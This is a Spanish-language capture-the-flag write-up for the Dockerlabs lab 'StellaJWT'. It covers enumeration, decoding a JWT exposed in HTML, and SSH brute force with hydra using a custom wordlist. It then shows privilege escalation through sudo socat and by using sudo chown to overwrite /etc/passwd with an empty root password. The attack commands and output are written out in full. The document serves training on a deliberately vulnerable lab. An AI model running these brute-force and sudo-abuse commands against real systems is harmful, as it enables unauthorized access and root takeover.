
# Writeup Template: Maquina `[ StellaJWT ]`

- Tags: #StellaJWT
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina StellaJWT](https://mega.nz/file/bFsR1SCD#ZrWjuyypHNSPS0VRDpyPKT8E8W4ZpKqnVGf27_VOu_k)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x stellarjwt.zip
sudo bash auto_deploy.sh stellarjwt.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL del servicio:
```bash
http://172.17.0.2/
```

En el tiene un mensaje:
```bash
¿Qué astrónomo alemán descubrió Neptuno?
```

Si investigamos en la web nos da el siguiente resultado: Tenemos un posible usuario del sistema.
```bash
Johann Gottfried Galle
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/universe/            (Status: 200) [Size: 11253]
```

Revisando el codigo fuente en esta ruta logramos ver un **JWT**
```bash
<!-- eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE -->
```

[JWToken](https://jwt.io/) Si ingresamos en esta web el **JWT** obtenemos lo siguiente:
```bash
{
  "sub": "1234567890",
  "user": "neptuno",
  "iat": 1516239022
}
```
### Credenciales Encontradas
- Usuario: `[ neptuno ]`
- Contraseña: `[  ]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos un potencial usuario lo usaremos Usaremos un diccionario personalizado en base al nombre que obtuvimos anteriormente, **( Johann Gottfried Galle )** 
Usamos nuestra herramienta en python para generar un diccionario personalizado en base a el usuario: **( Neptuno )**
```bash
genPasswd.py -i
```

Ingresamos los datos:
```bash
[+] Ingrese la información del objetivo (dejar en blanco si no aplica)

Nombre: Johann                                        
Apellido: Gottfried                     
Apodo: galle    
```
### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -l neptuno -P diccionario.txt -f ssh://172.17.0.2
```

Ahora tenemos las credenciales de acceso por **ssh** para este usuario:
```bash
[22][ssh] host: 172.17.0.2   login: neptuno   password: Gottfried
```
### Intrusion
Iniciamos sesion por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh neptuno@172.17.0.2 ( Gottfried )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
ls -la
```

Listando archivos ocultos vemos que existe uno:
```bash
cat .carta_a_la_NASA.txt
```

Contenido:
```bash
Buenos días, quiero entrar en la NASA. Ya respondí las preguntas que me hicieron. Se las respondo de nuevo por aquí.

¿Qué significan las siglas NASA? -> National Aeronautics and Space Administration
¿En que año se fundo la NASA? -> 1958
¿Quién fundó la NASA? -> Eisenhower
```

**Hallazgos Clave:**
- Binario con privilegios: `[ .carta_a_la_NASA.txt ]`

Listando los usuarios del sistema vemos que existe uno: **( nasa )**
- Credenciales de usuario: `[ nasa ]:[ Eisenhower ]` Probaremos esta password para loguearnos como este.

Nos logueamos como este usuario:
```bash
su nasa # ( Eisenhower )
```
### Explotacion de Privilegios

###### Usuario `[ Nasa ]`:
Listamos los permisos de estu usuario:
```bash
sudo -l

User nasa may run the following commands on 7e69c4a832de:
    (elite) NOPASSWD: /usr/bin/socat # Tenemos una via potencial de migrar a este usuario
```

Ejecutamos el binario
```bash
# Comando para escalar al usuario: ( elite )
sudo -u elite /usr/bin/socat stdin exec:/bin/bash
```

###### Usuario `[ Elite ]`:
Listamos los permisos de estu usuario:
```bash
sudo -l

User elite may run the following commands on 7e69c4a832de:
    (root) NOPASSWD: /usr/bin/chown # Tenemos una via potencial.
```

Nos aprovechamos de este binario para cambiar el propietario del archivo: **( /etc/passwd )**, Y asi poder modificarlo para quitarle la **( x )** al usuario **root** y poder loguearnos sin contrasena.
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
```

Ahora que este archivo nos pertenece procedemos a modificarlo: Ya que no tenemos editores de terminal procedemos a realizar lo siguiente:
```bash
cat /etc/passwd
```

Copiamos su contenido: Ya sin la **( x )** de **root**
```bash
echo "root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
neptuno:x:1001:1001:neptuno,,,:/home/neptuno:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
nasa:x:1002:1002:NASA,,,:/home/nasa:/bin/bash
elite:x:1000:1000:elite,,,:/home/elite:/bin/bash
" > /etc/passwd
```

Ahora solo nos logueamos como **root**
```bash
su root
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@7e69c4a832de:/home/elite# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a descifrar el cintenido de un **JWT**
2. Aprendimos a generar un diccionario personalizado en base a un usuario
3. Aprendimos a realizar fuerza bruta de un usuario obtenido por su JWT

## Recomendaciones de Seguridad
- Restringir el acceso a los **JWT**
- No otorgar privilegios **SUID** al binario **( chown )**